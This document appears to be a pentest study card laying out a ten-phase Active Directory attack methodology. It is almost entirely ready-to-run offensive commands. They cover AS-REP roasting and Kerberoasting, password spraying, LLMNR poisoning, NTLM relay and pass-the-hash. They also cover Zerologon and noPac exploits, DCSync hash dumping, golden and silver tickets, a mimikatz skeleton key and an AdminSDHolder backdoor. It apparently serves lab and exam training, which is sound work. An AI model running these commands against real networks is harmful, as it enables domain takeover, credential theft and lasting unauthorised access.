name: Argha Dey Active Directory Attack Methodology
description: 10-phase AD methodology: Recon → Enumeration → Foothold → Credential Access → PrivEsc → Lateral Movement → Domain Dominance → Persistence. Includes per-host quick reference and mental checklist before calling a box 'owned'.
examHabits: Confirm domain name, forest, DC(s) before exploitation
Check SMB signing + null session exposure
Extract flags / persistence artifacts as required
Document every credential + hash found (reused across trusts often)
quickRef: nxc smb <range>; impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat; kerberoasting with GetUserSPNs; DCSync via secretsdump -just-dc

decisionPoints.action: nxc smb <range> OR crackmapexec smb <range> - master map: IP, hostname, OS, domain, SMB signing, SMBv1
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>; nslookup -type=SRV _kerberos._tcp.<domain>; dig axfr @<dns-ip> <domain>
nmap --script smb-os-discovery -p445; nmap --script rdp-ntlm-info -p3389; nmap --script smtp-ntlm-info -p25; ldapsearch -x -H ldap://<dc-ip> -s base namingcontexts
decisionPoints.fallback: Use rpcclient null session for info leak

decisionPoints.action: rpcclient -U '' -N <dc-ip> then enumdomusers, enumdomgroups, querydominfo, enumtrust, lsaenumsid
kerbrute userenum -d <domain> --dc <dc-ip> usernames.txt
impacket-GetNPUsers <domain>/ -usersfile usernames.txt -no-pass -format hashcat -outputfile asrep.txt; hashcat -m 18200 asrep.txt rockyou.txt
decisionPoints.fallback: Check userAccountControl flag 4194304 via LDAP search

decisionPoints.action: nxc smb <target/range> -u users.txt -p passwords.txt --continue-on-success
hydra -L users.txt -P passwords.txt rdp://<target>; kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Password123!'
decisionPoints.fallback: Responder -I eth0 -wrf for LLMNR/NBT-NS poisoning; hashcat -m 5600 hash.txt rockyou.txt

decisionPoints.action: Check signing state: nmap --script smb2-security-mode; if not required, ntlmrelayx.py -tf targets.txt -smb2support
decisionPoints.fallback: Use Responder with SMB server disabled, relay captured hashes live

decisionPoints.action: ldapsearch for users, computers, groups, SPNs, trusts, delegation, foreignSecurityPrincipals, GPOs/OUs, password-in-description
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc-ip> -c All; load .json into BloodHound GUI
impacket-psexec <domain>/<user>:'<pass>'@<target>; impacket-wmiexec (quieter); impacket-smbexec
impacket-psexec -hashes :<NTLM-hash> <domain>/<user>@<target>; nxc smb <target> -u <user> -H <NTLM-hash>
impacket-getTGT <domain>/<user> -hashes :<NTLM-hash>; export KRB5CCNAME=<user>.ccache; impacket-psexec -k -no-pass <domain>/<user>@<target>
systeminfo; whoami /priv; whoami /groups; wmic qfe get HotFixID; winPEAS.exe; PowerUp Invoke-AllChecks
decisionPoints.fallback: Manual: check AlwaysInstallElevated, unquoted paths, weak service perms, scheduled tasks

decisionPoints.action: PrintSpoofer.exe -c cmd or GodPotato.exe -cmd 'C:\payload.exe'

decisionPoints.condition: SPN account with weak creds is privileged
decisionPoints.action: Kerberoast → crack hashcat -m 13100 → instant domain compromise
Set-ADAccountPassword -Identity <target> -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
Force DC auth via PrinterBug/PetitPotam; capture TGT with mimikatz sekurlsa::tickets /export
impacket-rbcd -delegate-from '<attacker>$' -delegate-to '<target>$' -action write; then impacket-getST -spn cifs/<target-fqdn> -impersonate administrator
decisionPoints.fallback: ADCS abuse: certipy find; certipy req -template <vuln-template>; certipy auth -pfx <cert>.pfx

decisionPoints.action: CrackMapExec / nxc to spray credentials across network; Evil-WinRM for WinRM-enabled hosts
impacket-secretsdump -just-dc <domain>/<user>:'<pass>'@<dc-ip> to extract all domain hashes
Zerologon (CVE-2020-1472): python3 cve-2020-1472-exploit.py <DC_NAME> <DC_IP> then secretsdump -no-pass; PrintNightmare (CVE-2021-1675)
decisionPoints.fallback: noPac.py -shell for SAMAccountName spoofing; PetitPotam for NTLM coerce → relay to ADCS

decisionPoints.action: mimikatz kerberos::golden /user:administrator /domain:<domain> /sid:<domain-sid> /krbtgt:<hash> /ptt OR impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <domain> administrator
decisionPoints.fallback: Silver ticket for specific service: kerberos::golden /service:cifs /target:<fqdn> /rc4:<svc-hash> /ptt

decisionPoints.action: mimikatz misc::skeleton (master password for all accounts)
decisionPoints.fallback: AdminSDHolder backdoor: modify ACL on AdminSDHolder to grant low-priv user full control (replicates every 60 min)

decisionPoints.action: DSRM password abuse: reg save HKLM\SAM/\SYSTEM; impacket-secretsdump -sam sam.save -system system.save LOCAL
decisionPoints.fallback: Plumhound for AD audit-log persistence tracking
